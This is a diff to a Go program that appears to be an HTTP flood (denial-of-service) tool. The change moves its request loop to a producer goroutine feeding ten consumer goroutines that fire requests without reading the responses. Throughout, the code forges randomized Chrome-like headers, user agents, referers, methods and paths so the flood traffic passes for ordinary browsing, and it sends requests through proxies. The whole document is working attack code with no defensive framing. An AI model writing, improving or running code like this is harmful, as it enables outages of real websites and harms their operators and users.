@@ -1,5 +1,5 @@
 package main
-
+// 2
 import (
     "crypto/tls"
     "flag"
@@ -165,38 +165,56 @@ func sendRequest(proxyAddr, target string) {
     client := clientPool.Get().(*http.Client)
     defer clientPool.Put(client)
 
-    for i := 0; i < 500; i++ {
-        headers := map[string]string{
-            "sec-purpose":               "prefetch;prerender",
-            "purpose":                   "prefetch",
-            "sec-ch-ua":                 fmt.Sprintf("\"Not_A Brand\";v=\"%d\", \"Chromium\";v=\"%d\", \"Google Chrome\";v=\"%d\"", getRandomInt(121, 345), getRandomInt(421, 6345), getRandomInt(421, 7124356)),
-            "sec-ch-ua-mobile":          "?0",
-            "sec-ch-ua-platform":        map[bool]string{true: "Windows", false: "MacOS"}[rand.Float32() < 0.5],
-            "upgrade-insecure-requests": "1",
-            "accept":                    acceptList[rand.Intn(len(acceptList))],
-            "accept-encoding":           "gzip, deflate, br",
-            "accept-language":           "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
-            "referer":                   "https://" + parsedURL.Host + randomPath(),
-            "user-agent":                userAgentList[rand.Intn(len(userAgentList))],
-        }
+    requestChan := make(chan *http.Request, 500)
+    var wg sync.WaitGroup
 
-        method := randomMethod()
-        path := randomPath()
-        req, err := http.NewRequest(method, target+path, nil)
-        if err != nil {
-            atomic.AddUint64(&errorCount, 1)
-            continue
+    // Producer goroutine
+    go func() {
+        for i := 0; i < 500; i++ {
+            headers := map[string]string{
+                "sec-purpose":               "prefetch;prerender",
+                "purpose":                   "prefetch",
+                "sec-ch-ua":                 fmt.Sprintf("\"Not_A Brand\";v=\"%d\", \"Chromium\";v=\"%d\", \"Google Chrome\";v=\"%d\"", getRandomInt(121, 345), getRandomInt(421, 6345), getRandomInt(421, 7124356)),
+                "sec-ch-ua-mobile":          "?0",
+                "sec-ch-ua-platform":        map[bool]string{true: "Windows", false: "MacOS"}[rand.Float32() < 0.5],
+                "upgrade-insecure-requests": "1",
+                "accept":                    acceptList[rand.Intn(len(acceptList))],
+                "accept-encoding":           "gzip, deflate, br",
+                "accept-language":           "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7",
+                "referer":                   "https://" + parsedURL.Host + randomPath(),
+                "user-agent":                userAgentList[rand.Intn(len(userAgentList))],
+            }
+
+            method := randomMethod()
+            path := randomPath()
+            req, err := http.NewRequest(method, target+path, nil)
+            if err != nil {
+                atomic.AddUint64(&errorCount, 1)
+                continue
+            }
+            for k, v := range headers {
+                req.Header.Set(k, v)
+            }
+            requestChan <- req
         }
-        for k, v := range headers {
-            req.Header.Set(k, v)
-        }
-        atomic.AddUint64(&requestCount, 1)
-        
-        // Fire and forget - no waiting for response
+        close(requestChan)
+    }()
+
+    // Consumer goroutines
+    for i := 0; i < 10; i++ {
+        wg.Add(1)
         go func() {
-            _, _ = client.Do(req) // Ignore response and errors
+            defer wg.Done()
+            for req := range requestChan {
+                atomic.AddUint64(&requestCount, 1)
+                go func(r *http.Request) {
+                    _, _ = client.Do(r)
+                }(req)
+            }
         }()
     }
+
+    wg.Wait()
 }
 
 func attack(wg *sync.WaitGroup, stopChan chan struct{}) {
